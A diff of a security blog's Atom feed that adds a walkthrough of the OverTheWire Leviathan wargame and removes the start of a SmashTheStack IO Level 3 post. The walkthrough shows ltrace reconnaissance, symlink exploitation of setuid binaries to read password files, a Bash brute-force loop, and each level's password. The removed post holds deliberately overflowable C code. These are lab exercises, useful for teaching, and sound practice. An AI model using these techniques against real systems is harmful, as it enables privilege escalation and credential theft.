@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2015-07-30T16:39:50+03:00</updated>
+  <updated>2015-08-03T14:05:34+03:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,445 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[OverTheWire: Leviathan]]></title>
+    <link href="http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan/"/>
+    <updated>2015-07-30T17:01:22+03:00</updated>
+    <id>http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan</id>
+    <content type="html"><![CDATA[<p>The next step in difficulty for the OverTheWire wargames is Leviathan. From the description:</p>
+
+<blockquote><p>This wargame doesn&rsquo;t require any knowledge about programming &ndash; just a bit of common sense and some knowledge about basic *nix commands.</p></blockquote>
+
+<p>Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on <strong>leviathan.labs.overthewire.org</strong> through SSH.</p>
+
+<p>To login to the first level use:</p>
+
+<p>Username: leviathan0</p>
+
+<p>Password: leviathan0</p>
+
+<p>Data for the levels can be found in the homedirectories.</p>
+
+<!-- more -->
+
+
+<h3>Level 0 &ndash;> Level 1</h3>
+
+<p>There is no information about what you have to do for each level to progress, so you just have to look around.</p>
+
+<p>If you do a <em>ls -la</em> in the home directory, you will see an interesting hidden directory owned by leviathan1:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan0@melinda:~$ ls -la
+</span><span class='line'>total 24
+</span><span class='line'>drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
+</span><span class='line'>drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
+</span><span class='line'>drwxr-x---   2 leviathan1 leviathan0 4096 Jul 17 16:44 .backup
+</span><span class='line'>-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
+</span><span class='line'>-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
+</span><span class='line'>-rw-r--r--   1 root       root        675 Apr  9  2014 .profile</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside there is a bookmarks.html file with lots of links, so I tried grepping for the word password and wasn&rsquo;t disappointed:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan0@melinda:~/.backup$ cat bookmarks.html  | grep password
+</span><span class='line'>&lt;DT&gt;&lt;A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"&gt;password to leviathan1&lt;/A&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level 1 &ndash;> Level 2</h3>
+
+<p>There is a setuid binary in the home folder that asks for a password. Running <em>strings</em> on it didn&rsquo;t reveal much, except that it uses <em>strcmp</em>..so it compares the input it receives with something..</p>
+
+<p>I solved this by running <em>ltrace</em> on the binary. <em>ltrace</em> is a library call tracer:</p>
+
+<blockquote><p>ltrace  is  a  program  that simply runs the specified command until it
+exits.  It intercepts and records the dynamic library calls  which  are
+called  by  the  executed process and the signals which are received by
+ that process.  It can also intercept and print the  system  calls  executed by the program.</p></blockquote>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan1@melinda:~$ ltrace ./check
+</span><span class='line'>__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 &lt;unfinished ...&gt;
+</span><span class='line'>printf("password: ")                                                                        = 10
+</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642password: abcd
+</span><span class='line'>)                                                = 97
+</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 98
+</span><span class='line'>getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 99
+</span><span class='line'>strcmp("abc", "sex")                                                                        = -1
+</span><span class='line'>puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
+</span><span class='line'>)                                                        = 29
+</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the <em>ltrace</em> output you can actually see the password that your input is compared with. Give it to the program and you will get a shell as leviathan2:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan1@melinda:~$ ./check 
+</span><span class='line'>password: sex
+</span><span class='line'>$ whoami
+</span><span class='line'>leviathan2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As in the previous wargame, look in <em>/etc/</em> for the password:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /etc/leviathan_pass/leviathan2
+</span><span class='line'>ougahZi8Ta</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level 2 &ndash;> Level 3</h3>
+
+<p>In this level we have another setuid binary named printfile. If you try to read the password file for the next level you just get a message that you an&rsquo;t have that file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
+</span><span class='line'>You cant have that file...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Running <em>ltrace</em> again we see the <em>access</em> system call is being used:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3   
+</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
+</span><span class='line'>access("/etc/leviathan_pass/leviathan3", 4)                                                 = -1
+</span><span class='line'>puts("You cant have that file..."You cant have that file...
+</span><span class='line'>)                                                          = 27
+</span><span class='line'>+++ exited (status 1) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is good news, because <em>access</em> is vulnerable to race conditions, as can be seen from its man page:</p>
+
+<blockquote><p>access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.</p>
+
+<p>The check is done using the calling process&rsquo;s real UID and GID,  rather than the effective IDs as is done when actually attempting an operation
+(e.g., open(2)) on the file.  This allows set-user-ID programs to  easily determine the invoking user&rsquo;s authority.</p>
+
+<p>Warning: Using access() to check if a user is authorized to, for  example, open a file before actually doing so using open(2) creates a security
+hole, because the user  might  exploit  the  short  time  interval between  checking and opening the file to manipulate it. For this reason, the   > use of this system call should be avoided.</p></blockquote>
+
+<p>A more detailed description from <a href="https://www.owasp.org/index.php/File_Access_Race_Condition:_TOCTOU">OWASP</a>:</p>
+
+<blockquote><p>The window of time between when a file property is checked and when the file is used can be exploited to launch a privilege escalation attack.</p>
+
+<p>File access race conditions, known as time-of-check, time-of-use (TOCTOU) race conditions, occur when:</p>
+
+<p>The program checks a property of a file, referencing the file by name.
+The program later performs a filesystem operation using the same filename and assumes that the previously-checked property still holds.</p></blockquote>
+
+<p>The first thing I thought was to create a file and make it a symlink to the password file, but it didn&rsquo;t work. So I just made a random file for test purposes and used <em>ltrace</em> again to see what is happening when accessing it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/readme
+</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd784, 0x8048600 &lt;unfinished ...&gt;
+</span><span class='line'>access("/tmp/baka/readme", 4)                                                               = 0
+</span><span class='line'>snprintf("/bin/cat /tmp/baka/readme", 511, "/bin/cat %s", "/tmp/baka/readme")               = 25
+</span><span class='line'>system("/bin/cat /tmp/baka/readme"test
+</span><span class='line'> &lt;no return ...&gt;
+</span><span class='line'>--- SIGCHLD (Child exited) ---
+</span><span class='line'>&lt;... system resumed&gt; )                                                                      = 0
+</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I have to say, I used help for this one, because it wasn&rsquo;t clear to me on how to proceed (it&rsquo;s also where I got stuck when I first attempted this wargame). If <em>access</em> returns successfully, it will <em>cat</em> the file that was passed to it (and it&rsquo;s actually <em>snprintf</em> that does the <em>cat</em>. Remember from Bandit how <em>cat</em> won&rsquo;t print files with spaces in their names, unless the spaces are escaped or the filename is surrounded by quotes. I made a new dummy file with a space in its name:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:/tmp/baka$ cat space\ file 
+</span><span class='line'>test
+</span><span class='line'>leviathan2@melinda:/tmp/baka$ cat space file
+</span><span class='line'>cat: space: No such file or directory
+</span><span class='line'>cat: file: No such file or directory</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now I ran <em>ltrace</em> again and tried to print this new file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/space\ file 
+</span><span class='line'>__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &lt;unfinished ...&gt;
+</span><span class='line'>access("/tmp/baka/space file", 4)                                                           = 0
+</span><span class='line'>snprintf("/bin/cat /tmp/baka/space file", 511, "/bin/cat %s", "/tmp/baka/space file")       = 29
+</span><span class='line'>system("/bin/cat /tmp/baka/space file"/bin/cat: /tmp/baka/space: No such file or directory
+</span><span class='line'>/bin/cat: file: No such file or directory
+</span><span class='line'> &lt;no return ...&gt;
+</span><span class='line'>--- SIGCHLD (Child exited) ---
+</span><span class='line'>&lt;... system resumed&gt; )                                                                      = 256
+</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a discrepancy between <em>access</em>, which checks the path of the file, and what <em>cat</em> tries to print, two different files that don&rsquo;t exist, <em>space</em> and <em>file</em> (because the space isn&rsquo;t seen as part of the filename, but as a separator between arguments):</p>
+
+<ul>
+<li><p><em>cat</em> tries /tmp/baka/space</p></li>
+<li><p><em>cat</em> tries file</p></li>
+</ul>
+
+
+<p>This is where the symbolic link exploitation part comes in place. It didn&rsquo;t work before, but if I now create a symlink to the password file and name it <em>space</em>, it will match the first half of the file that <em>cat</em> will try to print:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:/tmp/baka$ ls -l
+</span><span class='line'>total 8
+</span><span class='line'>-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 12:18 readme
+</span><span class='line'>lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 31 15:45 space -&gt; /etc/leviathan_pass/leviathan3
+</span><span class='line'>-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 15:01 space file</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And now I run <em>printfile</em> again:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ./printfile /tmp/baka/'space file'
+</span><span class='line'>Ahdiemoo1j
+</span><span class='line'>/bin/cat: file: No such file or directory</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yay! It worked! Because <em>cat</em> first tried to print <em>space</em>, it followed the symlink with the same name and printed the password!</p>
+
+<h3>Level 3 &ndash;> Level 4</h3>
+
+<p>And another setuid binary! Running <em>strings</em> on it revealed it&rsquo;s a program that gives you a shell if you enter the right password. Along with string names such as do_stuff, nothing and morenothing xD</p>
+
+<p><em>ltrace</em> keeps helping a lot with these challenges:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan3@melinda:~$ ltrace ./level3 
+</span><span class='line'>__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &lt;unfinished ...&gt;
+</span><span class='line'>strcmp("h0no33", "kakaka")                                                                  = -1
+</span><span class='line'>printf("Enter the password&gt; ")                                                              = 20
+</span><span class='line'>fgets(Enter the password&gt; huh
+</span><span class='line'>"huh\n", 256, 0xf7fcac20)                                                             = 0xffffd58c
+</span><span class='line'>strcmp("huh\n", "snlprintf\n")                                                              = -1
+</span><span class='line'>puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+</span><span class='line'>)                                                                  = 19
+</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first <em>strcmp</em> doesn&rsquo;t seem to be used for anything, but the second one is interesting. It compares the given input with..snlprintf?! There is no such function in the C library, so I assumed it&rsquo;s just a string..and:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan3@melinda:~$ ./level3 
+</span><span class='line'>Enter the password&gt; snlprintf
+</span><span class='line'>[You've got shell]!
+</span><span class='line'>$ whoami
+</span><span class='line'>leviathan4
+</span><span class='line'>$ cat /etc/leviathan_pass/leviathan4
+</span><span class='line'>vuH0coox6m</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Awesome! On to the next level!</p>
+
+<h3>Level 4 &ndash;> Level 5</h3>
+
+<p>There is a hidden directory in the home folder:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan4@melinda:~$ ls -la
+</span><span class='line'>total 24
+</span><span class='line'>drwxr-xr-x   3 root root       4096 Nov 14  2014 .
+</span><span class='line'>drwxr-xr-x 167 root root       4096 Jul  9 16:27 ..
+</span><span class='line'>-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
+</span><span class='line'>-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
+</span><span class='line'>-rw-r--r--   1 root root        675 Apr  9  2014 .profile
+</span><span class='line'>dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside there&rsquo;s a program that gives some binary output when run:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan4@melinda:~/.trash$ ./bin 
+</span><span class='line'>01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Convert it to Ascii for the password: <code>Tith4cokei</code></p>
+
+<h3>Level 5 &ndash;> Level 6</h3>
+
+<p>Another binary! If you run it, it says it can&rsquo;t find a file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan5@melinda:~$ ./leviathan5 
+</span><span class='line'>Cannot find /tmp/file.log</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is a setuid binary, so maybe we can trick it into reading the password file for the leviathan5 user. I made a symlink to the password file with the name of the missing file, and the binary followed it right to the password:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+</span><span class='line'>leviathan5@melinda:~$ ./leviathan5 
+</span><span class='line'>UgaoFee4li</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level 6 &ndash;> Level 7</h3>
+
+<p>And yet another binary! This one asks for a 4-digit code:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan6@melinda:~$ ./leviathan6 
+</span><span class='line'>usage: ./leviathan6 &lt;4 digit code&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lookint at the strings, it seems this program will give us a shell if we can find the right code. I was going to use Python again but I found a quick and easy way to bruteforce the code with a very small Bash script:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for </span>i in <span class="o">{</span>0000..9999<span class="o">}</span>
+</span><span class='line'><span class="k">do</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s1">&#39;Trying&#39;</span> <span class="nv">$i</span>
+</span><span class='line'>~/leviathan6 <span class="nv">$i</span>
+</span><span class='line'><span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This script iterates over the range of possible codes and tries each of them as input for the leviathan6 binary:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>...
+</span><span class='line'>Trying 7122
+</span><span class='line'>Wrong
+</span><span class='line'>Trying 7123
+</span><span class='line'>$ whoami
+</span><span class='line'>leviathan7
+</span><span class='line'>$ cat /etc/leviathan_pass/leviathan7
+</span><span class='line'>ahy7MaeBo9</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Level 7 &ndash;> Level 8</h3>
+
+<p>This is the final level, as you can see from the congratulatory note:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan7@melinda:~$ ls
+</span><span class='line'>CONGRATULATIONS
+</span><span class='line'>leviathan7@melinda:~$ cat CONGRATULATIONS 
+</span><span class='line'>Well Done, you seem to have used a *nix system before, now try something more serious.
+</span><span class='line'>(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Better skip over that last line&hellip;</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
+</span><span class='line'>/ Tomorrow will be cancelled due to lack \
+</span><span class='line'>\ of interest.                           /
+</span><span class='line'> ----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[OverTheWire: Bandit]]></title>
@@ -17867,165 +18306,6 @@ Each user on a system can have a different PATH variable.</p>
 
 <blockquote><p>Work consists of whatever a body is obliged to do.
 Play consists of whatever a body is not obliged to do.</p>
-
-<p>&mdash; Mark Twain</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SmashTheStack IO Level 3]]></title>
-    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/"/>
-    <updated>2014-07-07T21:37:07+03:00</updated>
-    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3</id>
-    <content type="html"><![CDATA[<p>This is the source code for level03.c:</p>
-
-<!-- more -->
-
-
-
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//bla, based on work by beach</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="nf">good</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Win.&quot;</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'><span class="kt">void</span> <span class="nf">bad</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I&#39;m so sorry, you&#39;re at %p and you want to be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">bad</span><span class="p">,</span> <span class="n">good</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">functionpointer</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="n">bad</span><span class="p">;</span>
-</span><span class='line'>        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span> <span class="o">||</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span>
-</span><span class='line'>                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
-</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">-</span> <span class="mi">4</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;This is exciting we&#39;re going to %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">functionpointer</span><span class="p">);</span>
-</span><span class='line'>        <span class="n">functionpointer</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Function overview</h4>
-
-<p><strong>memcpy</strong></p>
-
-<p><em>void <em>memcpy(void </em>dest, const void *src, size_t n);</em></p>
-
-<p>Copies  <em>n</em> bytes from memory area <em>src</em> to memory area <em>dest</em>. The memory areas must not overlap.</p>
-
-<p>The function does not check for any terminating null character in <em>src</em>.</p>
-
-<p>Returns a pointer to <em>dest</em>.</p>
-
-<p><strong>memset</strong></p>
-
-<p><em>void <em>memset(void </em>buf, int value, size_t count);</em></p>
-
-<p><em>buf</em> = Pointer to the block of memory to fill.</p>
-
-<p><em>value</em> = Value to be set. The value is passed as an int, but the function fills the block of memory using the unsigned char conversion of this value.</p>
-
-<p><em>count</em> = Number of bytes to be set to the value.</p>
-
-<p>Sets the first <em>count</em> bytes of the block of memory pointed by <em>buf</em> to the specified <em>value</em></p>
-
-<p>Returns a pointer to the memory area <em>buf</em></p>
-
-<p>The most common use of <em>memset()</em> is to initialize a region of memory to some known value.</p>
-
-<h4>Program description</h4>
-
-<p>Running the program we see this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
